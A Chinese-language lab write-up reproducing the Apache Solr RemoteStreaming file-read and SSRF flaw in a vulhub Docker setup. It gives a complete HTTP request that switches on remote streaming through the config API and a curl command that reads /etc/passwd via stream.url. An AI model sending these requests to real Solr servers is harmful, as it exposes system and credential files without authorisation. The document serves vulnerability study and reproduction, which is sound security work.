ailx10说：这篇是我2024年10月写的。RemoteStreaming 这篇，我把 Solr 当成一个会替我取数据的服务来观察。先确认配置开关和处理器，再用 file 路径读本地文件，随后换成回环地址看不同端口的响应。文件读取和 SSRF 就在这组小实验里连了起来，成功、拒绝连接和解析错误也各有含义。笔记里我想留的是“服务器从哪里取数据”这条线；管理接口能不能改配置、进程本身能读什么，都是边界，不能看到一个 stream.url 就把所有能力一起算上。

---

编辑核查提示：需要可配置 RemoteStreaming 且处理器可用；本地文件读取受 Solr 进程权限限制，连接错误只是探测线索。 原题代码和外部地址未重新运行；截图细字及水印仍待核对。

本文记录 Solr RemoteStreaming 的历史实验：配置开关及相关处理器可用时，服务端可能访问指定 URL 或可读本地文件。实际读取范围受权限和网络配置限制。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Apache Solr RemoteStreaming 文件读取与SSRF漏洞 环境搭建成功了

![](/notes-assets/436ecbae5c7161c4b8a7.webp)

（1）发送POST请求，开启`RemoteStreaming` 配置

```
POST /solr/demo/config HTTP/1.1
Host: 144.34.162.13:8983
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Connection: close
Content-Length: 80

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
```

![](/notes-assets/56285bfde7df88dcf0ce.webp)

（2）查看`passwd`文件

```
curl -i -s -k 'http://144.34.162.13:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```

![](/notes-assets/03fe498037fd4f0f64c2.webp)
